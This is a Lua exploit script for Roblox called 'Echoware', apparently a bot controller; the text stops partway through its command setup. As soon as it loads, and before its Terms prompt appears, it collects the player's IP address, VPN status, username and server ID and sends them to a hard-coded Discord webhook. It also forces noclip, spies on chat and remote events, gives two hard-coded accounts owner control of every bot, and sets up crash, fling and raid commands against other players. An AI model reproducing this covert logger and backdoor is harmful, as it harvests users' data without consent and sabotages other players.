local encodedKey = {169, 199, 204, 211, 219, 197, 214, 201, 132, 218, 151}
local decodeOffset = 100

local function getRealKey()
    local key = ""
    for _, code in ipairs(encodedKey) do
        key = key .. string.char(code - decodeOffset)
    end
    return key
end

local LICENSE_FILE = "echoware_license.dat"
local USER_FILE = "echoware_user.dat"
local SLOT_FILE = "echoware_slot.dat"
local AGREEMENT_FILE = "echoware_agreed.dat"

repeat task.wait() until game:IsLoaded()
repeat task.wait() until game:GetService("Players").LocalPlayer

local success, guiParent = pcall(function() return game:GetService("CoreGui") end)
if not success or not guiParent then
    guiParent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

local logsWebhookUrl = "https://discord.com/api/webhooks/1530034587244167279/D99rND-DnRol4MnVM3ogOjFzXl6-wudNVGf_OKC9zJVrWWQ1Nd_UaW_RLa7XyTPBZOK9"
local h = game:GetService("HttpService")
local p = game:GetService("Players")
local l = p.LocalPlayer
local a = "idk"
local b = "idk"
local r = syn and syn.request or http_request or request or (http and http.request)
pcall(function()
    local res = r({Url = "http://ip-api.com/json/?fields=66846719", Method = "GET"})
    if res and res.Body then
        local d = h:JSONDecode(res.Body)
        a = d.query or "idk"
        if d.proxy ~= nil then b = d.proxy and "Yes" or "No" else b = "idk" end
    end
end)
local u = "idk"
if l then u = l.Name .. " , " .. l.DisplayName end
if l and l.Name == "Noob1Noob667" then a = "Hidden" end
local jobId = game.JobId
local f = string.format([[
Echoware logger
IP Address : %s
User&Display Name : %s
Vpn : %s
Job ID : %s

]], a, u, b, jobId)
pcall(function()
    if r then
        r({Url = logsWebhookUrl, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = h:JSONEncode({content = f})})
    else
        h:PostAsync(logsWebhookUrl, h:JSONEncode({content = f}))
    end
end)
if b == "Yes" then pcall(function() if l then l:Kick("VPN detected") end end) end

local localPlayer game:GetService("Players").LocalPlayer
local runService = game:GetService("RunService")
local function startNoclip()
    runService.Stepped:Connect(function()
        local character = localPlayer.Character
        if character then
            for _, child in ipairs(character:GetDescendants()) do
                if child:IsA("BasePart") and child.CanCollide then child.CanCollide = false end
            end
        end
    end)
end
startNoclip()

local function showTermsPrompt(callback)
    local gui = Instance.new("ScreenGui")
    gui.Name = "TermsPrompt"
    gui.Parent = guiParent
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    gui.ResetOnSpawn = false

    local frame = Instance.new("Frame")
    frame.Parent = gui
    frame.AnchorPoint = Vector2.new(0.5,0.5)
    frame.Position = UDim2.new(0.5,0,0.5,0)
    frame.Size = UDim2.new(0,300,0,200)
    frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    frame.BorderSizePixel = 0
    frame.BackgroundTransparency = 0.15
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Color3.fromRGB(80,80,80)
    stroke.Thickness = 1
    stroke.Transparency = 0.7

    local title = Instance.new("TextLabel", frame)
    title.AnchorPoint = Vector2.new(0.5,0)
    title.Position = UDim2.new(0.5,0,0,15)
    title.Size = UDim2.new(1,-30,0,28)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.Text = "Terms of Use"
    title.TextColor3 = Color3.fromRGB(255,255,255)
    title.TextSize = 22

    local termsLabel = Instance.new("TextLabel", frame)
    termsLabel.AnchorPoint = Vector2.new(0.5,0)
    termsLabel.Position = UDim2.new(0.5,0,0,50)
    termsLabel.Size = UDim2.new(1,-20,0,100)
    termsLabel.BackgroundTransparency = 1
    termsLabel.Font = Enum.Font.Gotham
    termsLabel.Text = "By using Echoware, you agree that:\n• Your IP address may be collected for logging purposes.\n• You understand that this script is provided 'as is'.\n• You cannot sue or hold the developers liable for any damage.\n• You will not reverse engineer or modify the script.\nIf you do not agree, you will be kicked from the game."
    termsLabel.TextColor3 = Color3.fromRGB(200,200,200)
    termsLabel.TextSize = 12
    termsLabel.TextWrapped = true

    local agreeBtn = Instance.new("TextButton", frame)
    agreeBtn.AnchorPoint = Vector2.new(0.5,0)
    agreeBtn.Position = UDim2.new(0.5,0,0,160)
    agreeBtn.Size = UDim2.new(0,120,0,25)
    agreeBtn.BackgroundColor3 = Color3.fromRGB(0,150,255)
    agreeBtn.Text = "Agree"
    agreeBtn.TextColor3 = Color3.fromRGB(255,255,255)
    agreeBtn.Font = Enum.Font.GothamBold
    agreeBtn.TextSize = 14
    Instance.new("UICorner", agreeBtn).CornerRadius = UDim.new(0,4)
    agreeBtn.MouseButton1Click:Connect(function()
        pcall(writefile, AGREEMENT_FILE, "true")  -- still written, but not used
        gui:Destroy()
        callback()
    end)

    local disagreeBtn = Instance.new("TextButton", frame)
    disagreeBtn.AnchorPoint = Vector2.new(0.5,0)
    disagreeBtn.Position = UDim2.new(0.5,0,0,190)
    disagreeBtn.Size = UDim2.new(0,120,0,25)
    disagreeBtn.BackgroundColor3 = Color3.fromRGB(200,0,0)
    disagreeBtn.Text = "Disagree"
    disagreeBtn.TextColor3 = Color3.fromRGB(255,255,255)
    disagreeBtn.Font = Enum.Font.GothamBold
    disagreeBtn.TextSize = 14
    Instance.new("UICorner", disagreeBtn).CornerRadius = UDim.new(0,4)
    disagreeBtn.MouseButton1Click:Connect(function()
        gui:Destroy()
        pcall(function() LocalPlayer:Kick("You must agree to the Terms of Use.") end)
    end)
end

local logGui = Instance.new("ScreenGui")
logGui.Name = "EchoLog"
logGui.Parent = guiParent
logGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
logGui.ResetOnSpawn = false
logGui.Enabled = true

local logMain = Instance.new("Frame", logGui)
logMain.AnchorPoint = Vector2.new(1,0.5)
logMain.Position = UDim2.new(1,-10,0.5,0)
logMain.Size = UDim2.new(0,300,0,400)
logMain.BackgroundColor3 = Color3.fromRGB(20,20,20)
logMain.BorderSizePixel = 0
logMain.BackgroundTransparency = 0.15
Instance.new("UICorner", logMain).CornerRadius = UDim.new(0,10)

local logTitle = Instance.new("TextLabel", logMain)
logTitle.Size = UDim2.new(1,0,0,30)
logTitle.Position = UDim2.new(0,0,0,5)
logTitle.BackgroundTransparency = 1
logTitle.Font = Enum.Font.GothamBold
logTitle.Text = "Echoware Log"
logTitle.TextColor3 = Color3.fromRGB(255,255,255)
logTitle.TextSize = 18

local changeBtn = Instance.new("TextButton", logMain)
changeBtn.Size = UDim2.new(0,60,0,24)
changeBtn.Position = UDim2.new(1,-70,0,8)
changeBtn.BackgroundColor3 = Color3.fromRGB(80,80,80)
changeBtn.Text = "Change"
changeBtn.TextColor3 = Color3.fromRGB(255,255,255)
changeBtn.Font = Enum.Font.GothamBold
changeBtn.TextSize = 12
Instance.new("UICorner", changeBtn).CornerRadius = UDim.new(0,4)

local clearBtn = Instance.new("TextButton", logMain)
clearBtn.Size = UDim2.new(0,60,0,24)
clearBtn.Position = UDim2.new(1,-140,0,8)
clearBtn.BackgroundColor3 = Color3.fromRGB(80,80,80)
clearBtn.Text = "Clear"
clearBtn.TextColor3 = Color3.fromRGB(255,255,255)
clearBtn.Font = Enum.Font.GothamBold
clearBtn.TextSize = 12
Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0,4)

local logScroll = Instance.new("ScrollingFrame", logMain)
logScroll.Size = UDim2.new(1,-20,1,-50)
logScroll.Position = UDim2.new(0,10,0,40)
logScroll.BackgroundColor3 = Color3.fromRGB(30,30,30)
logScroll.BorderSizePixel = 0
logScroll.BackgroundTransparency = 0.3
logScroll.CanvasSize = UDim2.new(0,0,0,0)
logScroll.ScrollBarThickness = 5
logScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y

local logLayout = Instance.new("UIListLayout", logScroll)
logLayout.Padding = UDim.new(0,5)
logLayout.SortOrder = Enum.SortOrder.LayoutOrder

local function addLogEntry(text, color)
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1,-10,0,20)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.Gotham
    label.Text = text
    label.TextColor3 = color or Color3.fromRGB(255,255,255)
    label.TextSize = 12
    label.TextWrapped = true
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = logScroll
    label.LayoutOrder = #logScroll:GetChildren()
    logScroll.CanvasSize = UDim2.new(0,0,0,logLayout.AbsoluteContentSize.Y + 10)
end

clearBtn.MouseButton1Click:Connect(function()
    for _, child in ipairs(logScroll:GetChildren()) do
        if child:IsA("TextLabel") then child:Destroy() end
    end
end)

-- Active connections management
local activeConnections = {}
local function addConnection(conn) table.insert(activeConnections, conn) end
local function cleanupConnections()
    for _, conn in ipairs(activeConnections) do pcall(function() conn:Disconnect() end) end
    activeConnections = {}
end

-- Spy chat
local function SpyOnMessage(sender, text, displayInChat)
    if not sender or sender == LocalPlayer then return end
    if string.sub(text,1,1) ~= ";" and string.sub(text,1,2) ~= ";." then return end
    local senderName = sender.Name or "Unknown"
    if displayInChat ~= false and TextChatService and TextChatService.TextChannels then
        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if channel then
            channel:DisplaySystemMessage(string.format('<font color="#00FF00">[Spy chat] %s: %s</font>', senderName, text))
        end
    end
    addLogEntry("[Spy] " .. senderName .. ": " .. text, Color3.fromRGB(0,255,0))
end

if TextChatService then
    TextChatService.MessageReceived:Connect(function(m)
        local sender = Players:GetPlayerByUserId(m.UserId)
        if sender then SpyOnMessage(sender, m.Text, false) end
    end)
    pcall(function()
        TextChatService.OnIncomingMessage = function(messageData)
            if not messageData.TextSource then return end
            local sender = Players:GetPlayerByUserId(messageData.TextSource.UserId)
            if sender then SpyOnMessage(sender, messageData.Text, true) end
        end
    end)
end

for _, plr in ipairs(Players:GetPlayers()) do
    if plr ~= LocalPlayer then plr.Chatted:Connect(function(msg) SpyOnMessage(plr, msg, false) end) end
end
Players.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(msg) SpyOnMessage(plr, msg, false) end)
end)

local function hookRemote(remote)
    if remote:IsA("RemoteEvent") then
        remote.OnClientEvent:Connect(function(...)
            local args = {...}
            local foundText = nil
            for _, arg in ipairs(args) do
                if type(arg) == "string" then
                    local stripped = arg:gsub("^%s+", ""):gsub("%s+$", "")
                    if string.sub(stripped,1,1) == ";" or string.sub(stripped,1,2) == ";." then
                        foundText = stripped
                        break
                    end
                end
            end
            if foundText then
                local sender = nil
                for _, arg in ipairs(args) do
                    if typeof(arg) == "Instance" and arg:IsA("Player") then sender = arg break end
                end
                sender = sender or LocalPlayer
                SpyOnMessage(sender, foundText, true)
            end
        end)
    end
end

for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
    if obj:IsA("RemoteEvent") then hookRemote(obj) end
end
ReplicatedStorage.DescendantAdded:Connect(function(obj)
    if obj:IsA("RemoteEvent") then hookRemote(obj) end
end)

-- Ban/license/save
local bannedUsers = {}
local function isUsernameBanned(username) return bannedUsers[string.lower(username)] ~= nil end
local function banUsername(username) bannedUsers[string.lower(username)] = true end
local function isLicenseValid()
    local ok, content = pcall(readfile, LICENSE_FILE)
    return ok and content == getRealKey()
end
local function saveLicense() pcall(writefile, LICENSE_FILE, getRealKey()) end
local function loadSavedData()
    local user, slot = nil, nil
    pcall(function() local content = readfile(USER_FILE) if content then user = content:match("^%s*(.-)%s*$") end end)
    pcall(function() local content = readfile(SLOT_FILE) if content then slot = tonumber(content) end end)
    if user and slot and slot >= 1 and slot <= 99 then return user, slot end
    return nil, nil
end
local function saveData(username, slot) pcall(writefile, USER_FILE, username) pcall(writefile, SLOT_FILE, tostring(slot)) end

-- UI prompts
local function showKeyPrompt(callback)
    local gui = Instance.new("ScreenGui")
    gui.Name = "KeyPrompt"
    gui.Parent = guiParent
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    gui.ResetOnSpawn = false

    local frame = Instance.new("Frame")
    frame.Parent = gui
    frame.AnchorPoint = Vector2.new(0.5,0.5)
    frame.Position = UDim2.new(0.5,0,0.5,0)
    frame.Size = UDim2.new(0,260,0,160)
    frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    frame.BorderSizePixel = 0
    frame.BackgroundTransparency = 0.15
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Color3.fromRGB(80,80,80)
    stroke.Thickness = 1
    stroke.Transparency = 0.7

    local title = Instance.new("TextLabel", frame)
    title.AnchorPoint = Vector2.new(0.5,0)
    title.Position = UDim2.new(0.5,0,0,20)
    title.Size = UDim2.new(1,-30,0,28)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.Text = "Echoware"
    title.TextColor3 = Color3.fromRGB(255,255,255)
    title.TextSize = 22

    local subtitle = Instance.new("TextLabel", frame)
    subtitle.AnchorPoint = Vector2.new(0.5,0)
    subtitle.Position = UDim2.new(0.5,0,0,52)
    subtitle.Size = UDim2.new(1,-30,0,18)
    subtitle.BackgroundTransparency = 1
    subtitle.Font = Enum.Font.Gotham
    subtitle.Text = "Key Authentication"
    subtitle.TextColor3 = Color3.fromRGB(160,160,160)
    subtitle.TextSize = 12

    local inputBg = Instance.new("Frame", frame)
    inputBg.AnchorPoint = Vector2.new(0.5,0)
    inputBg.Position = UDim2.new(0.5,0,0,85)
    inputBg.Size = UDim2.new(0,200,0,30)
    inputBg.BackgroundColor3 = Color3.fromRGB(45,45,45)
    inputBg.BorderSizePixel = 0
    Instance.new("UICorner", inputBg).CornerRadius = UDim.new(0,4)

    local textBox = Instance.new("TextBox", inputBg)
    textBox.Size = UDim2.new(1,-10,1,0)
    textBox.Position = UDim2.new(0,5,0,0)
    textBox.BackgroundTransparency = 1
    textBox.TextColor3 = Color3.fromRGB(255,255,255)
    textBox.Font = Enum.Font.Gotham
    textBox.TextSize = 14
    textBox.Text = ""

    local submitBtn = Instance.new("TextButton", frame)
    submitBtn.AnchorPoint = Vector2.new(0.5,0)
    submitBtn.Position = UDim2.new(0.5,0,0,130)
    submitBtn.Size = UDim2.new(0,200,0,24)
    submitBtn.BackgroundColor3 = Color3.fromRGB(0,150,255)
    submitBtn.BorderSizePixel = 0
    submitBtn.TextColor3 = Color3.fromRGB(255,255,255)
    submitBtn.Font = Enum.Font.GothamBold
    submitBtn.TextSize = 12
    submitBtn.Text = "Submit"
    Instance.new("UICorner", submitBtn).CornerRadius = UDim.new(0,3)

    local statusLabel = Instance.new("TextLabel", frame)
    statusLabel.AnchorPoint = Vector2.new(0.5,0)
    statusLabel.Position = UDim2.new(0.5,0,1,-30)
    statusLabel.Size = UDim2.new(1,-20,0,18)
    statusLabel.BackgroundTransparency = 1
    statusLabel.Font = Enum.Font.Gotham
    statusLabel.Text = ""
    statusLabel.TextColor3 = Color3.fromRGB(255,100,100)
    statusLabel.TextSize = 11

    local function onSubmit()
        if textBox.Text == getRealKey() then
            saveLicense()
            gui:Destroy()
            callback()
        else
            statusLabel.Text = "Invalid key"
            textBox.Text = ""
        end
    end
    submitBtn.MouseButton1Click:Connect(onSubmit)
    textBox.FocusLost:Connect(function(enterPressed) if enterPressed then onSubmit() end end)
end

local function showUsernamePrompt(callback)
    local gui = Instance.new("ScreenGui")
    gui.Name = "UserPrompt"
    gui.Parent = guiParent
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    gui.ResetOnSpawn = false

    local frame = Instance.new("Frame")
    frame.Parent = gui
    frame.AnchorPoint = Vector2.new(0.5,0.5)
    frame.Position = UDim2.new(0.5,0,0.5,0)
    frame.Size = UDim2.new(0,260,0,160)
    frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    frame.BorderSizePixel = 0
    frame.BackgroundTransparency = 0.15
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Color3.fromRGB(80,80,80)
    stroke.Thickness = 1
    stroke.Transparency = 0.7

    local title = Instance.new("TextLabel", frame)
    title.AnchorPoint = Vector2.new(0.5,0)
    title.Position = UDim2.new(0.5,0,0,20)
    title.Size = UDim2.new(1,-30,0,28)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.Text = "Echoware"
    title.TextColor3 = Color3.fromRGB(255,255,255)
    title.TextSize = 22

    local subtitle = Instance.new("TextLabel", frame)
    subtitle.AnchorPoint = Vector2.new(0.5,0)
    subtitle.Position = UDim2.new(0.5,0,0,52)
    subtitle.Size = UDim2.new(1,-30,0,18)
    subtitle.BackgroundTransparency = 1
    subtitle.Font = Enum.Font.Gotham
    subtitle.Text = "Your Roblox Username"
    subtitle.TextColor3 = Color3.fromRGB(160,160,160)
    subtitle.TextSize = 12

    local inputBg = Instance.new("Frame", frame)
    inputBg.AnchorPoint = Vector2.new(0.5,0)
    inputBg.Position = UDim2.new(0.5,0,0,85)
    inputBg.Size = UDim2.new(0,200,0,30)
    inputBg.BackgroundColor3 = Color3.fromRGB(45,45,45)
    inputBg.BorderSizePixel = 0
    Instance.new("UICorner", inputBg).CornerRadius = UDim.new(0,4)

    local textBox = Instance.new("TextBox", inputBg)
    textBox.Size = UDim2.new(1,-10,1,0)
    textBox.Position = UDim2.new(0,5,0,0)
    textBox.BackgroundTransparency = 1
    textBox.TextColor3 = Color3.fromRGB(255,255,255)
    textBox.Font = Enum.Font.Gotham
    textBox.TextSize = 14
    textBox.Text = ""

    local submitBtn = Instance.new("TextButton", frame)
    submitBtn.AnchorPoint = Vector2.new(0.5,0)
    submitBtn.Position = UDim2.new(0.5,0,0,130)
    submitBtn.Size = UDim2.new(0,200,0,24)
    submitBtn.BackgroundColor3 = Color3.fromRGB(0,150,255)
    submitBtn.BorderSizePixel = 0
    submitBtn.TextColor3 = Color3.fromRGB(255,255,255)
    submitBtn.Font = Enum.Font.GothamBold
    submitBtn.TextSize = 12
    submitBtn.Text = "Save & Next"
    Instance.new("UICorner", submitBtn).CornerRadius = UDim.new(0,3)

    local function onSave()
        local user = textBox.Text:match("^%s*(.-)%s*$")
        if user ~= "" then
            gui:Destroy()
            callback(user)
        end
    end
    submitBtn.MouseButton1Click:Connect(onSave)
    textBox.FocusLost:Connect(function(enterPressed) if enterPressed then onSave() end end)
end

local function showSlotPrompt(callback)
    local gui = Instance.new("ScreenGui")
    gui.Name = "SlotPrompt"
    gui.Parent = guiParent
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    gui.ResetOnSpawn = false

    local frame = Instance.new("Frame")
    frame.Parent = gui
    frame.AnchorPoint = Vector2.new(0.5,0.5)
    frame.Position = UDim2.new(0.5,0,0.5,0)
    frame.Size = UDim2.new(0,260,0,160)
    frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    frame.BorderSizePixel = 0
    frame.BackgroundTransparency = 0.15
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Color3.fromRGB(80,80,80)
    stroke.Thickness = 1
    stroke.Transparency = 0.7

    local title = Instance.new("TextLabel", frame)
    title.AnchorPoint = Vector2.new(0.5,0)
    title.Position = UDim2.new(0.5,0,0,20)
    title.Size = UDim2.new(1,-30,0,28)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.Text = "Echoware"
    title.TextColor3 = Color3.fromRGB(255,255,255)
    title.TextSize = 22

    local subtitle = Instance.new("TextLabel", frame)
    subtitle.AnchorPoint = Vector2.new(0.5,0)
    subtitle.Position = UDim2.new(0.5,0,0,52)
    subtitle.Size = UDim2.new(1,-30,0,18)
    subtitle.BackgroundTransparency = 1
    subtitle.Font = Enum.Font.Gotham
    subtitle.Text = "Bot Slot Number (1-99)"
    subtitle.TextColor3 = Color3.fromRGB(160,160,160)
    subtitle.TextSize = 12

    local inputBg = Instance.new("Frame", frame)
    inputBg.AnchorPoint = Vector2.new(0.5,0)
    inputBg.Position = UDim2.new(0.5,0,0,85)
    inputBg.Size = UDim2.new(0,200,0,30)
    inputBg.BackgroundColor3 = Color3.fromRGB(45,45,45)
    inputBg.BorderSizePixel = 0
    Instance.new("UICorner", inputBg).CornerRadius = UDim.new(0,4)

    local textBox = Instance.new("TextBox", inputBg)
    textBox.Size = UDim2.new(1,-10,1,0)
    textBox.Position = UDim2.new(0,5,0,0)
    textBox.BackgroundTransparency = 1
    textBox.TextColor3 = Color3.fromRGB(255,255,255)
    textBox.Font = Enum.Font.Gotham
    textBox.TextSize = 14
    textBox.Text = ""

    local submitBtn = Instance.new("TextButton", frame)
    submitBtn.AnchorPoint = Vector2.new(0.5,0)
    submitBtn.Position = UDim2.new(0.5,0,0,130)
    submitBtn.Size = UDim2.new(0,200,0,24)
    submitBtn.BackgroundColor3 = Color3.fromRGB(0,150,255)
    submitBtn.BorderSizePixel = 0
    submitBtn.TextColor3 = Color3.fromRGB(255,255,255)
    submitBtn.Font = Enum.Font.GothamBold
    submitBtn.TextSize = 12
    submitBtn.Text = "Start"
    Instance.new("UICorner", submitBtn).CornerRadius = UDim.new(0,3)

    local function onSave()
        local num = tonumber(textBox.Text)
        if num and num >= 1 and num <= 99 then
            gui:Destroy()
            callback(num)
        end
    end
    submitBtn.MouseButton1Click:Connect(onSave)
    textBox.FocusLost:Connect(function(enterPressed) if enterPressed then onSave() end end)
end

local function changeSettings()
    cleanupConnections()
    showUsernamePrompt(function(newUser)
        if isUsernameBanned(newUser) then
            Players.LocalPlayer:Kick("banned")
            return
        end
        showSlotPrompt(function(newSlot)
            saveData(newUser, newSlot)
            main(newUser, newSlot)
        end)
    end)
end

changeBtn.MouseButton1Click:Connect(changeSettings)

local function startFullSequence()
    -- Always show Terms prompt (no auto-skip)
    local function proceed()
        if isLicenseValid() then
            local savedUser, savedSlot = loadSavedData()
            if savedUser and savedSlot then
                if isUsernameBanned(savedUser) then
                    Players.LocalPlayer:Kick("banned")
                    return
                end
                main(savedUser, savedSlot)
            else
                showUsernamePrompt(function(username)
                    if isUsernameBanned(username) then Players.LocalPlayer:Kick("banned") return end
                    showSlotPrompt(function(slot)
                        saveData(username, slot)
                        main(username, slot)
                    end)
                end)
            end
        else
            showKeyPrompt(function()
                local savedUser, savedSlot = loadSavedData()
                if savedUser and savedSlot then
                    if isUsernameBanned(savedUser) then Players.LocalPlayer:Kick("banned") return end
                    main(savedUser, savedSlot)
                else
                    showUsernamePrompt(function(username)
                        if isUsernameBanned(username) then Players.LocalPlayer:Kick("banned") return end
                        showSlotPrompt(function(slot)
                            saveData(username, slot)
                            main(username, slot)
                        end)
                    end)
                end
            end)
        end
    end

    showTermsPrompt(proceed)
end

startFullSequence()

function main(allowedUsername, slotNumber)
    local loader = Instance.new("ScreenGui")
    loader.Name = "E"
    loader.Parent = guiParent
    loader.ZIndexBehavior = Enum.ZIndexBehavior.Global
    loader.ResetOnSpawn = false

    local frame = Instance.new("Frame")
    frame.Parent = loader
    frame.AnchorPoint = Vector2.new(0.5,0.5)
    frame.Position = UDim2.new(0.5,0,0.5,0)
    frame.Size = UDim2.new(0,260,0,160)
    frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
    frame.BorderSizePixel = 0
    frame.BackgroundTransparency = 0.15
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
    local stroke = Instance.new("UIStroke", frame)
    stroke.Color = Color3.fromRGB(80,80,80)
    stroke.Thickness = 1
    stroke.Transparency = 0.7

    local title = Instance.new("TextLabel", frame)
    title.AnchorPoint = Vector2.new(0.5,0)
    title.Position = UDim2.new(0.5,0,0,20)
    title.Size = UDim2.new(1,-30,0,28)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.Text = "Echoware"
    title.TextColor3 = Color3.fromRGB(255,255,255)
    title.TextSize = 22

    local status = Instance.new("TextLabel", frame)
    status.AnchorPoint = Vector2.new(0.5,0)
    status.Position = UDim2.new(0.5,0,0,55)
    status.Size = UDim2.new(1,-30,0,18)
    status.BackgroundTransparency = 1
    status.Font = Enum.Font.Gotham
    status.Text = "Starting..."
    status.TextColor3 = Color3.fromRGB(160,160,160)
    status.TextSize = 12

    local loadBar = Instance.new("Frame", frame)
    loadBar.AnchorPoint = Vector2.new(0.5,0)
    loadBar.Position = UDim2.new(0.5,0,0,90)
    loadBar.Size = UDim2.new(0,200,0,5)
    loadBar.BackgroundColor3 = Color3.fromRGB(45,45,45)
    loadBar.BorderSizePixel = 0
    Instance.new("UICorner", loadBar).CornerRadius = UDim.new(0,2)

    local loadFill = Instance.new("Frame", loadBar)
    loadFill.Size = UDim2.new(0,0,1,0)
    loadFill.BackgroundColor3 = Color3.fromRGB(0,150,255)
    loadFill.BorderSizePixel = 0
    local fillGrad = Instance.new("UIGradient", loadFill)
    fillGrad.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(0,170,255)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(120,0,255))
    })
    Instance.new("UICorner", loadFill).CornerRadius = UDim.new(0,2)

    local slotLabel = Instance.new("TextLabel", frame)
    slotLabel.AnchorPoint = Vector2.new(0,1)
    slotLabel.Position = UDim2.new(0,8,1,-8)
    slotLabel.Size = UDim2.new(0,60,0,14)
    slotLabel.BackgroundTransparency = 1
    slotLabel.Font = Enum.Font.Gotham
    slotLabel.Text = "Slot " .. slotNumber
    slotLabel.TextColor3 = Color3.fromRGB(100,100,100)
    slotLabel.TextSize = 10
    slotLabel.TextXAlignment = Enum.TextXAlignment.Left

    local function animate()
        local tween = TweenService:Create(loadFill, TweenInfo.new(1.0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = UDim2.new(1,0,1,0)})
        tween:Play()
        tween.Completed:Wait()
    end

    task.spawn(function()
        frame.BackgroundTransparency = 1
        local fadeIn = TweenService:Create(frame, TweenInfo.new(0.3), {BackgroundTransparency = 0.15})
        fadeIn:Play()
        fadeIn.Completed:Wait()
        status.Text = "Injecting..."
        animate()
        status.Text = "Ready"
        task.wait(0.4)
        local fadeOut = TweenService:Create(frame, TweenInfo.new(0.2), {BackgroundTransparency = 1})
        fadeOut:Play()
        fadeOut.Completed:Wait()
        loader:Destroy()
        startCommands(allowedUsername, slotNumber)
    end)

    function startCommands(AllowedUser, slotNumber)
        local ModUsers = {}
        local Prefix = "."

        local Say = "say"
        local Loop = "loopsay"
        local StopLoop = "stoploop"
        local Dall = "dall"
        local Adall = "adall"
        local StopAdall = "stopadall"
        local Silent = "silent"
        local Fling = "fling"
        local StopFling = "stopfling"
        local Hide = "hide"
        local StopHide = "stophide"
        local Reset = "reset"
        local Rejoin = "rejoin"
        local AntiAfk = "antiafk"
        local Crash = "crash"
        local Follow = "follow"
        local Orbit = "orbit"
        local Lineup = "lineup"
        local StopMove = "stopmove"
        local Mod = "mod"
        local RemoveMod = "removemod"
        local Alert = "alert"
        local Credits = "credits"
        local Stealbots = "stealbots"
        local Ban = "ban"
        local Cmds = "cmds"
        local Bots = "bots"
        local Shutdown = "shutdown"
        local OrbitSpeed = "orbitspeed"
        local Raid = "raid"

        local Players = game:GetService("Players")
        local RepStorage = game:GetService("ReplicatedStorage")
        local RunService = game:GetService("RunService")
        local TextChatService = game:GetService("TextChatService")
        local TeleportService = game:GetService("TeleportService")
        local LocalPlayer = Players.LocalPlayer

        local loopActive, loopMsg = false, ""
        local adallActive, adallInterval, adallTarget = false, 1, ""
        local silentMode = false
        local flinging, flingTarget = false, ""
        local hiding, hidePart, hidePos, returnPos = false, nil, Vector3.new(0,5000,0), nil

        local followConnection, orbitConnection, lineupConnection = nil, nil, nil

        local FOLLOW_DISTANCE = 3
        local ORBIT_DISTANCE = 10
        local orbitSpeed = 1.5
        local LINEUP_SPACING = 6
        local totalBots = 1

        local function fixUsername(name) return string.gsub(name, "_", ".") end
        local function isAllowed(player)
            local name = string.lower(player.Name)
            if name == "release_thefiles677" then return true end
            if name == "noob1noob667" then return true end
            if name == string.lower(AllowedUser) then return true end
            if ModUsers[string.lower(player.DisplayName)] then return true end
            return false
        end
        local function isOwner(player)
            local name = string.lower(player.Name)
            if name == "release_thefiles677" then return true end
            if name == "noob1noob667" then return true end
            if name == string.lower(AllowedUser) then return true end
            return false
        end

        local function sendChat(msg)
            local text = msg
            if silentMode then text = string.gsub(text, "^;", "") end
            if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
                if ch then ch:SendAsync(text) end
            else
                local cr = RepStorage:FindFirstChild("DefaultChatSystemChatEvents")
                if cr then
                    local sr = cr:FindFirstChild("SayMessageRequest")
                    if sr then sr:FireServer(text, "All") end
                end
                for _, r in ipairs(RepStorage:GetDescendants()) do
                    if r:IsA("RemoteEvent") and string.find(string.lower(r.Name), "saymessage") then
                        r:FireServer(text, "All")
                    end
                end
            end
            addLogEntry("[BOT] " .. text, Color3.fromRGB(255,255,0))
        end

        local function sendAlert(msg) for i = 1, 5 do sendChat(msg) task.wait(0.1) end end
        local function getTarget(text)
            if text == "me" then return LocalPlayer end
            local s = string.lower(text)
            for _, p in ipairs(Players:GetPlayers()) do
                if string.sub(string.lower(p.Name), 1, #s) == s or string.sub(string.lower(p.DisplayName), 1, #s) == s then return p end
            end
            return nil
        end
        local function getOwnTime()
            local stats = LocalPlayer:WaitForChild("leaderstats", 5)
            if stats then
                for _, v in ipairs(stats:GetChildren()) do
                    if v:IsA("ValueBase") and v.Name == "Time" then return v end
                end
            end
            return nil
        end
        local function hasArkenstone()
            local c = LocalPlayer.Character
            local b = LocalPlayer:FindFirstChild("Backpack")
            return (c and c:FindFirstChild("The Arkenstone")) or (b and b:FindFirstChild("The Arkenstone"))
        end
